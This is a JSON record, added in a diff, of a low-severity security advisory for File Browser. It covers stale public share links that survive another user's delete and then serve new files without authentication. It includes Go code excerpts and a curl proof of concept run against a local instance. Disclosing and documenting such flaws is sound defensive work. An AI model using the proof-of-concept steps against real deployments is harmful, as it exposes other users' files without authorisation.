@@ -1,0 +1,50 @@
+{
+  "global": null,
+  "id": "GHSA-r6pg-pg54-rcr5",
+  "repo": {
+    "cve_id": "CVE-2026-82236",
+    "cvss_severities": {
+      "cvss_v3": {
+        "score": 3.1,
+        "vector_string": "CVSS:3.1/AV:N/AC:H/PR:L/UI:N/S:U/C:L/I:N/A:N"
+      },
+      "cvss_v4": {
+        "score": null,
+        "vector_string": null
+      }
+    },
+    "cwe_ids": [
+      "CWE-459"
+    ],
+    "description": "## Summary\r\n\r\nWhen a file is deleted, File Browser cleans up the public share links that pointed at it - but only\r\nthose owned by the user performing the delete. If an administrator, or any other user whose scope\r\nresolves the same path, deletes a file that someone else had publicly shared, the owner's share record\r\nsurvives. When any file later appears at that path, the old unauthenticated link - original password and\r\nexpiry intact - serves the new, unrelated content.\r\n\r\nVerified at v2.63.23, the final release. The owner filter on this path was introduced in v2.63.6 by the\r\nfix for GHSA-5ww9-jg6q-38r7.\r\n\r\n## Details\r\n\r\nThe delete handler passes the deleter's user ID into share cleanup:\r\n\r\n```go\r\n// http/resource.go:110 (resourceDeleteHandler)\r\nerr = d.store.Share.DeleteWithPathPrefix(file.Path, d.user.ID)\r\n```\r\n\r\nThe Bolt backend then skips every share that is not owned by that user:\r\n\r\n```go\r\n// storage/bolt/share.go:93-96 (DeleteWithPathPrefix)\r\nfor _, link := range links {\r\n\tif link.UserID != userID {\r\n\t\tcontinue\r\n\t}\r\n```\r\n\r\nThat filter was added in [`0231b7eb`](https://github.com/filebrowser/filebrowser/commit/0231b7eb) to stop\r\none user from deleting another user's share links through the share-management API. It applies to this\r\nfilesystem-event cleanup path as well, so the cleanup now misses exactly the shares that the delete has\r\ninvalidated. `withHashFile` resolves `link.Path` lazily on each request (`http/public.go:41-53`), so the\r\nsurviving link 404s while the path is absent and serves whatever file appears there next.\r\n\r\n## PoC\r\n\r\nTwo users, `editor` and `admin`, both scoped to `/`.\r\n\r\n```bash\r\nBASE=http://127.0.0.1:8099\r\nED=$(curl -s -X POST $BASE/api/login -H 'Content-Type: application/json' \\\r\n  -d '{\"username\":\"editor\",\"password\":\"…\"}')\r\nAD=$(curl -s -X POST $BASE/api/login -H 'Content-Type: application/json' \\\r\n  -d '{\"username\":\"admin\",\"password\":\"…\"}')\r\n\r\n# 1. editor creates and publicly shares a file\r\ncurl -s -X POST \"$BASE/api/resources/x.txt\" -H \"X-Auth: $ED\" --data 'OLD-CONTENT'\r\nHASH=$(curl -s -X POST \"$BASE/api/share/x.txt\" -H \"X-Auth: $ED\" -d '{}' | jq -r .hash)\r\ncurl -s \"$BASE/api/public/dl/$HASH/x.txt\"          # → OLD-CONTENT (unauthenticated)\r\n\r\n# 2. ADMIN deletes the file\r\ncurl -s -o /dev/null -w '%{http_code}\\n' -X DELETE \"$BASE/api/resources/x.txt\" \\\r\n  -H \"X-Auth: $AD\"                                 # → 204\r\n\r\n# 3. editor's share record survived the admin's delete\r\ncurl -s \"$BASE/api/shares\" -H \"X-Auth: $ED\"        # → still lists {\"path\":\"/x.txt\",…}\r\n\r\n# 4. editor recreates the file with new content\r\ncurl -s -X POST \"$BASE/api/resources/x.txt\" -H \"X-Auth: $ED\" --data 'NEW-CONTENT'\r\n\r\n# 5. the old link serves the NEW file, unauthenticated\r\ncurl -s \"$BASE/api/public/dl/$HASH/x.txt\"          # → NEW-CONTENT   (replayed 2/2)\r\n```\r\n\r\nWhen `editor` deletes her **own** shared file, the share is removed and the recreated file stays private\r\n(404) - confirming the cleanup works only for same-user deletes.\r\n\r\n## Impact\r\n\r\nAny workflow where a privileged user deletes another user's shared file - admin cleanup, a shared scope -\r\nsilently leaves the public link alive. The link later exposes whatever new file appears at that path,\r\nunauthenticated, with no indication to the owner that their link is still live.\r\n\r\n## Patches\r\n\r\nNone. The project is no longer maintained and no fix will ship.\r\n\r\n## Workarounds\r\n\r\n- Administrators can audit every user's links with `GET /api/shares` and revoke any of them with\r\n  `DELETE /api/share/{hash}`. Do that after deleting a path that belongs to another user.\r\n- Give shares an expiry and a password, so a resurrected link is time-bounded and not anonymously usable.\r\n- Avoid granting several accounts delete permission over one identical scope.\r\n\r\n## Out of scope\r\n\r\nShare paths are stored relative to the owner's scope (`Path: r.URL.Path` in `sharePostHandler`, resolved\r\nagainst the owner's filesystem in `withHashFile`). The gap is therefore only reachable when the deleter\r\nand the share owner resolve the *same* path string - in practice, when they hold the same scope. Where\r\nscopes overlap under different roots, the stored path and the deleted path differ, and the prefix query\r\nwould not match the other user's share with or without the owner filter.\r\n\r\nFor the same reason, this advisory does not endorse the reported remediation of dropping the owner filter\r\noutright: that would let one user's delete destroy an unrelated user's share whose scope-relative path\r\nmerely happens to collide, re-opening GHSA-5ww9-jg6q-38r7. A correct fix would have to resolve each\r\ncandidate share's path through its own owner's scope before deciding.\r\n\r\n## References\r\n\r\n- GHSA-5ww9-jg6q-38r7 - cross-user share-link deletion; its fix introduced the owner filter on this path.\r\n- GHSA-m8v4-4w34-rrvf - the rename path performs no share cleanup at all.\r\n- GHSA-pp88-jhwj-5qh5 - stale share left by a trailing-slash delete (the same impact class).\r\n",
+    "ghsa_id": "GHSA-r6pg-pg54-rcr5",
+    "html_url": "https://github.com/filebrowser/filebrowser/security/advisories/GHSA-r6pg-pg54-rcr5",
+    "identifiers": [
+      {
+        "type": "GHSA",
+        "value": "GHSA-r6pg-pg54-rcr5"
+      },
+      {
+        "type": "CVE",
+        "value": "CVE-2026-82236"
+      }
+    ],
+    "published_at": "2026-08-14T08:09:07Z",
+    "references": [],
+    "severity": "low",
+    "summary": "Deleting another user's shared file leaves their public share link behind",
+    "updated_at": "2026-08-31T19:51:13Z",
+    "vulnerabilities": [
+      {
+        "package": {
+          "ecosystem": "go",
+          "name": "github.com/filebrowser/filebrowser/v2"
+        },
+        "patched_versions": "",
+        "vulnerable_version_range": ">= 2.63.6, <= 2.63.23"
+      }
+    ],
+    "withdrawn_at": null
+  },
+  "repository": "filebrowser/filebrowser"
+}
